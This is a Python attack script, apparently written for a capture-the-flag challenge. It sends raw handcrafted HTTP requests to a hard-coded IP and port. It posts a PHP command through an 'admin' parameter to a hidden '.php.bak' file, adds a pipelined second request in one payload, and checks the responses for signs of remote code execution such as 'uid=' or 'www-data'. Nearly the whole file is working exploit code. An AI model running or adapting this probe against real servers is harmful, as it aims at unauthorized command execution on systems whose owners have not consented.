import socket
import urllib.parse
import time

host = '61.147.171.105'
port = 58039

def send_payload(name, payload_bytes):
    print(f"\n=== Testing {name} ===")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))
        sock.send(payload_bytes)
        
        response = b''
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk: break
                response += chunk
            except socket.timeout:
                break
        sock.close()
        
        decoded = response.decode('utf-8', errors='replace')
        status_line = decoded.split('\r\n')[0]
        print(f"Status: {status_line}")
        
        # Check for execution evidence
        if "uid=" in decoded or "www-data" in decoded or "System" in decoded or "PHP Version" in decoded:
            print("[!!!] POTENTIAL EXECUTION DETECTED [!!!]")
            print(decoded[:500])
        elif "<?php" in decoded:
            print("[-] Returned source code (Not executed)")
        else:
            print("[-] No obvious output")
            print(decoded[:200])

    except Exception as e:
        print(f"Error: {e}")

cmd = 'echo "TEST_EXEC_SUCCESS";'
post_body = 'admin=' + urllib.parse.quote(cmd)
content_len = len(post_body)

# Payload 0: Control - POST to .bak only
p0 = (
    f'POST /s3Cr37_f1L3.php.bak HTTP/1.1\r\n'
    f'Host: {host}\r\n'
    f'Content-Type: application/x-www-form-urlencoded\r\n'
    f'Content-Length: {content_len}\r\n'
    '\r\n'
    f'{post_body}'
)

# Payload 1: POST to .bak, followed by GET .php
p1 = (
    f'POST /s3Cr37_f1L3.php.bak HTTP/1.1\r\n'
    f'Host: {host}\r\n'
    f'Content-Type: application/x-www-form-urlencoded\r\n'
    f'Content-Length: {content_len}\r\n'
    '\r\n'
    f'{post_body}'
    'GET /index.php HTTP/1.1\r\n'
    '\r\n'
)

send_payload("Control POST .bak", p0.encode())
send_payload("POST .bak + GET .php", p1.encode())
